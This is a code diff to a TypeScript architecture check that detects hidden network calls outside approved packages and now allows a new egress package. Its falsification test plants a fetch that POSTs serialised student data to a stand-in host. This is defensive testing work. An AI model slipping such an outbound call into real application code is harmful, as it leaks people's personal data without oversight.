@@ -216,10 +216,10 @@ const lockGate: Gate<{ lock: Lock }> = {
 
 const egressGate: Gate<Record<string, string>> = {
   id: 'no-hidden-egress',
-  protects: 'Only the model client and the outbound gate may reach the network; domain and agent code cannot (PRD P2).',
-  definition: 'fetch|http.request|https.request outside packages/models and packages/runtime/src/approval.ts',
+  protects: 'Only the model client and the egress block may reach the network; domain, agent and server code cannot (PRD P2).',
+  definition: 'fetch|http.request|https.request outside packages/models and packages/egress',
   check: (files) => {
-    const bad = Object.entries(files).filter(([p, src]) => !p.startsWith('packages/models/') && !p.includes('/test/') && !p.startsWith('tools/') && /\bfetch\s*\(|\bhttps?\.request\s*\(/.test(src));
+    const bad = Object.entries(files).filter(([p, src]) => !p.startsWith('packages/models/') && !p.startsWith('packages/egress/') && !p.includes('/test/') && !p.startsWith('tools/') && /\bfetch\s*\(|\bhttps?\.request\s*\(/.test(src));
     return bad.length ? fail('no-hidden-egress', bad.map(([p]) => p).join(', ')) : pass('no-hidden-egress', `${Object.keys(files).length} files scanned`);
   },
   falsification: [{ name: 'planted fetch in a domain file', plant: () => ({ 'apps/advocate/src/domain/leak.ts': "await fetch('https://example.com', { method: 'POST', body: JSON.stringify(student) })" }) }],
